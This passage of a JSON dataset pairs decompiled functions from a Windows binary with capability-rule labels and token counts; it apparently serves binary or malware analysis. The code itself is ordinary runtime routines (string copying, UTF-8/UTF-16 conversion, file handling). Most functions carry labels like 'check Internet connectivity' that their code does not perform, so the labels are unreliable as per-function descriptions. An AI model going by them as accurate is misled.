            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007d3a0(int64_t *arg1, ulong *arg2, uint64_t arg3, uchar *arg4)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    uchar *puVar5;\n    uint64_t arg3_00;\n    ulong *arg4_00;\n    ulong unaff_R14;\n    uint64_t in_stack_00000028;\n    \n    piVar1 = *0x14010fc90;\n    puVar5 = *arg1;\n    arg4_00 = *(puVar5 + -0x18);\n    if (arg4_00 < arg2) {\ncode_r0x00014007d5b0:\n        arg1_00 = fcn.1400b7b60(0x14010a9b0, 0x14010aa9e, arg2, arg4_00);\n        fcn.14007bf20(arg4 + -0x18);\n        fcn.140014f30(arg1_00);\n        piVar4 = fcn.14007d3a0(arg1_00, unaff_R14, arg2, *arg4_00);\n        return piVar4;\n    }\n    arg3_00 = arg4_00 - arg2;\n    if (arg3 < arg4_00 - arg2) {\n        arg3_00 = arg3;\n    }\n    if ((0x3ffffffffffffff9 - arg4_00) + arg3_00 < in_stack_00000028) {\n        fcn.1400bd360(0x14010aa9e);\n        goto code_r0x00014007d5b0;\n    }\n    if ((arg4 < puVar5) || (arg4_00 + puVar5 < arg4)) {\ncode_r0x00014007d4b0:\n        fcn.14007d8a0(arg1, arg2, arg3_00, in_stack_00000028);\n        if (in_stack_00000028 != 0) {\n            if (in_stack_00000028 == 1) {\n                *(arg2 + *arg1) = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(arg2 + *arg1, arg4, in_stack_00000028);\n            }\n        }\n    }\n    else {\n        if (**0x14010fc90 == 0) {\n            if (0 < *(puVar5 + -8)) goto code_r0x00014007d4b0;\n        }\n        else {\n            if (0 < *(puVar5 + -8)) goto code_r0x00014007d4b0;\n            puVar5 = *arg1;\n        }\n        if (puVar5 + arg2 < arg4 + in_stack_00000028) {\n            if (arg4 < puVar5 + arg2 + arg3_00) {\n                puVar5 = fcn.14007b960(arg4, arg4 + in_stack_00000028);\n                fcn.14007d8a0(arg1, arg2, arg3_00, in_stack_00000028);\n                if (in_stack_00000028 != 0) {\n                    if (in_stack_00000028 == 1) {\n                        *(arg2 + *arg1) = *puVar5;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(arg2 + *arg1, puVar5, in_stack_00000028);\n                    }\n                }\n                if (*piVar1 == 0) {\n                    iVar3 = *(puVar5 + -8);\n                    *(puVar5 + -8) = iVar3 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = puVar5 + -8;\n                    iVar3 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (0 < iVar3) {\n                    return arg1;\n                }\n                fcn.1400bc6c0(puVar5 + -0x18);\n                return arg1;\n            }\n            iVar2 = (in_stack_00000028 - arg3_00) - puVar5;\n        }\n        else {\n            iVar2 = -puVar5;\n        }\n        fcn.14007d8a0(arg1, arg2, arg3_00, in_stack_00000028);\n        puVar5 = *arg1 + arg2;\n        if (in_stack_00000028 == 1) {\n            *puVar5 = arg4[*arg1 + iVar2];\n        }\n        else if (in_stack_00000028 != 0) {\n            sub.msvcrt.dll_memcpy(puVar5, arg4 + *arg1 + iVar2, in_stack_00000028);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1083
    },
    "14007eab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007eab0(int64_t arg1, uchar *arg2)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    ushort *puVar5;\n    uint32_t uVar6;\n    char in_R8B;\n    \n    uVar2 = *(arg1 + 0x18);\n    *arg2 = 0x25;\n    puVar5 = arg2 + 1;\n    if ((uVar2 & 0x800) != 0) {\n        arg2[1] = 0x2b;\n        puVar5 = arg2 + 2;\n    }\n    if ((uVar2 & 0x400) != 0) {\n        *puVar5 = 0x23;\n        puVar5 = puVar5 + 1;\n    }\n    uVar6 = uVar2 & 0x104;\n    if (uVar6 == 0x104) {\n        if (in_R8B != '\\0') {\n            *puVar5 = in_R8B;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x41;\n        *(puVar5 + 1) = 0;\n        return;\n    }\n    *puVar5 = *0x14010e20c;\n    puVar1 = puVar5 + 1;\n    if (in_R8B != '\\0') {\n        *(puVar5 + 1) = in_R8B;\n        puVar1 = puVar5 + 3;\n    }\n    if (uVar6 == 4) {\n        cVar4 = 'f';\n    }\n    else {\n        uVar3 = -((uVar2 & 0x4000) == 0) & 0x20;\n        if (uVar6 == 0x100) {\n            cVar4 = uVar3 + 0x45;\n        }\n        else {\n            cVar4 = uVar3 + 0x47;\n        }\n    }\n    *puVar1 = cVar4;\n    *(puVar1 + 1) = 0;\n    return;\n}\n",
        "token_count": 507
    },
    "1400810f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.1400810f0(int16_t *arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int16_t **arg1_00;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint8_t in_stack_00000028;\n    int16_t *piStack56;\n    int64_t iStack48;\n    \n    piStack56 = arg1;\n    if (((((in_stack_00000028 & 4) != 0) && (2 < arg2 - arg1)) && (*arg1 == -0x4411)) && (*(arg1 + 1) == -0x41)) {\n        piStack56 = arg1 + 3;\n    }\n    uVar3 = 0;\n    uVar2 = 1;\n    arg1_00 = &piStack56;\n    iStack48 = arg2;\n    if (1 < arg3) {\n        do {\n            uVar1 = fcn.140081620(arg1_00, arg4);\n            if (arg4 < uVar1) {\n                return piStack56;\n            }\n            if (uVar1 < 0x10000) {\n                uVar2 = uVar3;\n            }\n            uVar3 = uVar2 + 1;\n            uVar2 = uVar2 + 2;\n        } while (uVar2 < arg3);\n    }\n    if (arg3 != uVar2) {\n        return piStack56;\n    }\n    uVar1 = 0xffff;\n    if (arg4 < 0x10000) {\n        uVar1 = arg4;\n    }\n    fcn.140081620(&piStack56, uVar1);\n    return piStack56;\n}\n",
        "token_count": 396
    },
    "14008130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140081300(int16_t **arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int16_t *piVar2;\n    \n    uVar1 = *arg2;\n    if (((uVar1 & 4) != 0) && (piVar2 = *arg1,  1 < arg1[1] - piVar2)) {\n        if (*piVar2 == -2) {\n            *arg1 = piVar2 + 1;\n            *arg2 = uVar1 & 0xfffffffe;\n            return;\n        }\n        if (*piVar2 == -0x101) {\n            *arg1 = piVar2 + 1;\n            *arg2 = uVar1 | 1;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "14008135": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140081350(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t in_R8D;\n    int32_t iVar2;\n    \n    iVar2 = (arg1 + 0x76c) - (arg2 < 2);\n    iVar1 = iVar2 + 3;\n    if (-1 < iVar2) {\n        iVar1 = iVar2;\n    }\n    return ((((((iVar1 >> 2) + (arg1 + -0x46) * 0x16d) - iVar2 / 100) - ((iVar1 >> 2) % 0x19 >> 0x1f)) + iVar2 / 400 +\n             *(arg2 * 2 + 0x140110bc0) + -0x1da + in_R8D) % 7 + 7U) % 7;\n}\n",
        "token_count": 196
    },
    "14008149": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140081490(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    puVar3 = *arg1;\n    uVar5 = arg1[1] - puVar3;\n    if (arg1[1] == puVar3) {\n        return 0xfffffffe;\n    }\n    uVar1 = *puVar3;\n    if (uVar1 < 0x80) {\n        *arg1 = puVar3 + 1;\n        return uVar1;\n    }\n    if (0xc1 < uVar1) {\n        if (uVar1 < 0xe0) {\n            if (uVar5 == 1) {\n                return 0xfffffffe;\n            }\n            if ((puVar3[1] & 0xc0) == 0x80) {\n                uVar4 = uVar1 * 0x40 + -0x3080 + puVar3[1];\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 2;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf0) {\n            if (uVar5 < 3) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((uVar2 & 0xc0) == 0x80) && (((uVar1 != 0xe0 || (0x9f < uVar2)) && ((puVar3[2] & 0xc0) == 0x80)))) {\n                uVar4 = uVar1 * 0x1000 + -0xe2080 + puVar3[2] + uVar2 * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 3;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf5) {\n            if (uVar5 < 4) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((((uVar2 & 0xc0) == 0x80) && ((uVar1 != 0xf0 || (0x8f < uVar2)))) &&\n                ((uVar1 != 0xf4 || (uVar2 < 0x90)))) && (((puVar3[2] & 0xc0) == 0x80 && ((puVar3[3] & 0xc0) == 0x80))))\n            {\n                uVar4 = uVar1 * 0x40000 + -0x3c82080 + puVar3[3] + uVar2 * 0x1000 + puVar3[2] * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 4;\n                return uVar4;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 721
    },
    "14008162": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140081620(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    puVar3 = *arg1;\n    uVar5 = arg1[1] - puVar3;\n    if (arg1[1] == puVar3) {\n        return 0xfffffffe;\n    }\n    uVar1 = *puVar3;\n    if (uVar1 < 0x80) {\n        *arg1 = puVar3 + 1;\n        return uVar1;\n    }\n    if (0xc1 < uVar1) {\n        if (uVar1 < 0xe0) {\n            if (uVar5 == 1) {\n                return 0xfffffffe;\n            }\n            if ((puVar3[1] & 0xc0) == 0x80) {\n                uVar4 = uVar1 * 0x40 + -0x3080 + puVar3[1];\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 2;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf0) {\n            if (uVar5 < 3) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((uVar2 & 0xc0) == 0x80) && (((uVar1 != 0xe0 || (0x9f < uVar2)) && ((puVar3[2] & 0xc0) == 0x80)))) {\n                uVar4 = uVar1 * 0x1000 + -0xe2080 + puVar3[2] + uVar2 * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 3;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf5) {\n            if (uVar5 < 4) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((((uVar2 & 0xc0) == 0x80) && ((uVar1 != 0xf0 || (0x8f < uVar2)))) &&\n                ((uVar1 != 0xf4 || (uVar2 < 0x90)))) && (((puVar3[2] & 0xc0) == 0x80 && ((puVar3[3] & 0xc0) == 0x80))))\n            {\n                uVar4 = uVar1 * 0x40000 + -0x3c82080 + puVar3[3] + uVar2 * 0x1000 + puVar3[2] * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 4;\n                return uVar4;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 721
    },
    "1400817b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1400817b0(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    \n    uVar2 = arg2;\n    if (arg2 < 0x80) {\n        puVar1 = *arg1;\n        if (arg1[1] == puVar1) {\n            return 0;\n        }\n        *arg1 = puVar1 + 1;\n        *puVar1 = uVar2;\n    }\n    else if (arg2 < 0x800) {\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 2) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 6) - 0x40;\n        *arg1 = puVar1 + 2;\n        puVar1[1] = (uVar2 & 0x3f) + 0x80;\n    }\n    else if (arg2 < 0x10000) {\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 3) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 0xc) - 0x20;\n        puVar1[1] = (arg2 >> 6 & 0x3f) + 0x80;\n        *arg1 = puVar1 + 3;\n        puVar1[2] = (uVar2 & 0x3f) + 0x80;\n    }\n    else {\n        if (0x10ffff < arg2) {\n            return 0;\n        }\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 4) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 0x12) - 0x10;\n        puVar1[1] = (arg2 >> 0xc & 0x3f) + 0x80;\n        puVar1[2] = (arg2 >> 6 & 0x3f) + 0x80;\n        *arg1 = puVar1 + 4;\n        puVar1[3] = (uVar2 & 0x3f) + 0x80;\n    }\n    return 1;\n}\n",
        "token_count": 527
    },
    "1400818d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1400818d0(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    \n    if (arg2 < 0x80) {\n        puVar1 = *arg1;\n        if (arg1[1] == puVar1) {\n            return 0;\n        }\n        *arg1 = puVar1 + 1;\n        *puVar1 = arg2;\n    }\n    else {\n        if (arg2 < 0x800) {\n            puVar1 = *arg1;\n            if (arg1[1] - puVar1 < 2) {\n                return 0;\n            }\n            *arg1 = puVar1 + 1;\n            *puVar1 = (arg2 >> 6) - 0x40;\n        }\n        else {\n            if (arg2 < 0x10000) {\n                puVar1 = *arg1;\n                if (arg1[1] - puVar1 < 3) {\n                    return 0;\n                }\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0xc) - 0x20;\n            }\n            else {\n                if (0x10ffff < arg2) {\n                    return 0;\n                }\n                puVar1 = *arg1;\n                if (arg1[1] - puVar1 < 4) {\n                    return 0;\n                }\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0x12) - 0x10;\n                puVar1 = *arg1;\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0xc & 0x3f) + 0x80;\n            }\n            puVar1 = *arg1;\n            *arg1 = puVar1 + 1;\n            *puVar1 = (arg2 >> 6 & 0x3f) + 0x80;\n        }\n        puVar1 = *arg1;\n        *arg1 = puVar1 + 1;\n        *puVar1 = (arg2 & 0x3f) + 0x80;\n    }\n    return 1;\n}\n",
        "token_count": 497
    },
    "140081d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140081d90(uint16_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    ushort *puVar2;\n    char cVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t in_stack_00000028;\n    \n    if ((arg4 & 2) != 0) {\n        puVar2 = *arg2;\n        if (arg2[1] - puVar2 < 3) {\n            return 1;\n        }\n        *(puVar2 + 1) = 0xbf;\n        *puVar2 = 0xbbef;\n        *arg2 = *arg2 + 3;\n    }\n    puVar4 = *arg1;\n    uVar6 = arg1[1] - puVar4;\n    if (arg1[1] != puVar4) {\n        do {\n            uVar1 = *puVar4;\n            arg2_00 = uVar1;\n            uVar5 = uVar1;\n            if (uVar1 - 0xd800 < 0x400) {\n                if (in_stack_00000028 == 1) {\n                    return 2;\n                }\n                if (uVar6 < 3) {\n                    return 0;\n                }\n                if (0x3ff < puVar4[1] - 0xdc00) {\n                    return 2;\n                }\n                iVar7 = 2;\n                uVar5 = puVar4[1] + 0xfca02400 + uVar5 * 0x400;\n                arg2_00 = uVar5;\n            }\n            else {\n                if (uVar1 - 0xdc00 < 0x400) {\n                    return 2;\n                }\n                iVar7 = 1;\n            }\n            if (arg3 < uVar5) {\n                return 2;\n            }\n            cVar3 = fcn.1400818d0(arg2, arg2_00);\n            if (cVar3 == '\\0') {\n                return 1;\n            }\n            puVar4 = *arg1 + iVar7;\n            *arg1 = puVar4;\n            uVar6 = arg1[1] - puVar4;\n        } while (puVar4 != arg1[1]);\n    }\n    return 0;\n}\n",
        "token_count": 545
    },
    "140081ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140081ef0(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140020260(arg3);\n    if ((iVar1 != 0) && (*arg1 == 0)) {\n        iVar1 = fcn.140015970(arg2, iVar1);\n        *arg1 = iVar1;\n        if (iVar1 != 0) {\n            *(arg1 + 1) = 1;\n            return arg1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 127
    },
    "140081f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140081f40(int64_t **arg1, ulong arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t **ppiVar3;\n    ushort uVar4;\n    int64_t iVar5;\n    ulong uStack16;\n    \n    iVar2 = fcn.140020260(arg3 & 0xffffffff);\n    if ((iVar2 == 0) || (*arg1 != NULL)) {\ncode_r0x000140081fb8:\n        ppiVar3 = NULL;\n    }\n    else {\n        uStack16 = 0;\n        iVar5 = 0;\n        do {\n            cVar1 = *(iVar2 + iVar5);\n            if (cVar1 == 'b') {\n                uVar4 = 0x62;\n            }\n            else if (cVar1 < 'c') {\n                if (cVar1 == '+') {\n                    uVar4 = 0x2b;\n                }\n                else {\n                    if (cVar1 != 'a') goto code_r0x000140081fb8;\n                    uVar4 = 0x61;\n                }\n            }\n            else if (cVar1 == 'r') {\n                uVar4 = 0x72;\n            }\n            else {\n                if (cVar1 != 'w') goto code_r0x000140081fb8;\n                uVar4 = 0x77;\n            }\n            *(&uStack16 + iVar5 * 2) = uVar4;\n            iVar5 = iVar5 + 1;\n        } while (*(iVar2 + iVar5) != '\\0');\n        ppiVar3 = (*_sym.imp.msvcrt.dll__wfopen)(arg2);\n        *arg1 = ppiVar3;\n        if (ppiVar3 != NULL) {\n            *(arg1 + 1) = 1;\n            ppiVar3 = arg1;\n        }\n    }\n    return ppiVar3;\n}\n",
        "token_count": 431
    },
    "14008201": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140082010(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    if (*arg1 == 0) {\n        return NULL;\n    }\n    if (*(arg1 + 1) == '\\0') {\n        *arg1 = 0;\n    }\n    else {\n        iVar1 = fcn.14001e4d0();\n        *arg1 = 0;\n        if (iVar1 != 0) {\n            return NULL;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 116
    },
    "14008218": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140082180(int64_t *arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    \n    pcVar2 = _sym.imp.msvcrt.dll__errno;\n    if ((*arg1 == 0) && (arg2 != 0)) {\n        puVar4 = (*_sym.imp.msvcrt.dll__errno)();\n        uVar1 = *puVar4;\n        puVar4 = (*pcVar2)();\n        *puVar4 = 0;\n        do {\n            iVar3 = sub.msvcrt.dll_fflush(arg2);\n            if (iVar3 == 0) {\n                puVar4 = (*pcVar2)();\n                *puVar4 = uVar1;\n                *arg1 = arg2;\n                *(arg1 + 1) = 0;\n                return arg1;\n            }\n            piVar5 = (*pcVar2)();\n        } while (*piVar5 == 4);\n        puVar4 = (*pcVar2)();\n        *puVar4 = uVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 262
    },
    "1400821f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400821f0(int64_t *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140020260(arg3 & 0xffffffff);\n    if ((iVar1 != 0) && (*arg1 == 0)) {\n        iVar1 = sub.msvcrt.dll__fdopen(arg2, iVar1);\n        *arg1 = iVar1;\n        if (iVar1 != 0) {\n            *(arg1 + 1) = 1;\n            if (arg2 == 0) {\n                sub.msvcrt.dll_setvbuf(iVar1, 0, 4, 0);\n            }\n            return arg1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 170
    },
    "1400823d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400823d0(int64_t *arg1)\n\n{\n    if ((*arg1 != 0) && (*(arg1 + 1) != '\\0')) {\n    // WARNING: Could not recover jumptable at 0x00014001e4d0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_fclose)(*arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "14008244": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140082440(int64_t **arg1, ulong *arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    int64_t unaff_RBX;\n    int64_t **unaff_RBP;\n    ulong unaff_RSI;\n    ulong *unaff_RDI;\n    \n    while( true ) {\n        puVar4 = arg2;\n        ppiVar3 = arg1;\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        if ((puVar4 + arg3 == NULL) || (puVar4 != NULL)) break;\n        arg1 = 0x14010e560;\n        *(*0x20 + -0x60) = 0x1400824c4;\n        puVar5 = puVar4;\n        fcn.1400bd270(0x14010e560);\n        arg2 = *puVar5;\n        unaff_RBX = arg3;\n        *0x20 = *0x20 + -0x58;\n        unaff_RBP = ppiVar3;\n        unaff_RDI = puVar4;\n        arg3 = puVar5[1];\n    }\n    *(*0x20 + -0x60) = 0x14008246d;\n    piVar1 = fcn.14007c090(arg3, 0);\n    piVar2 = piVar1 + 3;\n    if (arg3 == 1) {\n        *(piVar1 + 3) = *puVar4;\n    }\n    else if (arg3 != 0) {\n        *(*0x20 + -0x60) = 0x1400824ab;\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar4, arg3);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg3;\n    *(piVar1 + arg3 + 0x18) = 0;\n    *ppiVar3 = piVar2;\n    return;\n}\n",
        "token_count": 525
    },
    "1400826d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400826d0(int64_t **arg1, ulong *arg2, int64_t *arg3)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t **ppiVar4;\n    int64_t **noname_0;\n    ulong *puVar5;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t **ppiStack88;\n    ulong *puStack80;\n    int64_t *piStack32;\n    \n    ppiVar4 = arg1 + 2;\n    *arg1 = ppiVar4;\n    if ((arg2 == NULL) && (arg3 != NULL)) {\n        noname_0 = 0x14010e5d0;\n        puStack80 = 0x140082786;\n        puVar5 = arg2;\n        fcn.1400bd270(0x14010e5d0);\n        piVar2 = puVar5[1];\n        ppiVar4 = noname_0 + 2;\n        *noname_0 = ppiVar4;\n        puVar3 = *puVar5;\n        piStack104 = piVar2;\n        piStack96 = arg3;\n        ppiStack88 = arg1;\n        puStack80 = arg2;\n        if (piVar2 < 0x10) {\n            if (piVar2 == 0x1) {\n                uVar1 = *puVar3;\n                noname_0[1] = 0x1;\n                *(noname_0 + 2) = uVar1;\n                *(noname_0 + 0x11) = 0;\n                return;\n            }\n            if (piVar2 == NULL) {\n                noname_0[1] = NULL;\n                *ppiVar4 = 0;\n                return;\n            }\n        }\n        else {\n            ppiVar4 = fcn.1400a9310(noname_0, &stack0xffffffffffffff98, 0);\n            *noname_0 = ppiVar4;\n            noname_0[2] = piStack104;\n        }\n        sub.msvcrt.dll_memcpy(ppiVar4, puVar3, piVar2);\n        noname_0[1] = piStack104;\n        *(*noname_0 + piStack104) = 0;\n        return;\n    }\n    piStack32 = arg3;\n    if (arg3 < 0x10) {\n        if (arg3 == 0x1) {\n            uVar1 = *arg2;\n            arg1[1] = 0x1;\n            *(arg1 + 2) = uVar1;\n            *(arg1 + 0x11) = 0;\n            return;\n        }\n        if (arg3 == NULL) {\n            arg1[1] = NULL;\n            *ppiVar4 = 0;\n            return;\n        }\n    }\n    else {\n        puStack80 = 0x140082748;\n        ppiVar4 = fcn.1400a9310(arg1, &stack0xffffffffffffffe0, 0);\n        *arg1 = ppiVar4;\n        arg1[2] = piStack32;\n    }\n    puStack80 = 0x140082762;\n    sub.msvcrt.dll_memcpy(ppiVar4, arg2, arg3);\n    arg1[1] = piStack32;\n    *(*arg1 + piStack32) = 0;\n    return;\n}\n",
        "token_count": 772
    },
    "1400a27c": {
        "rules": [
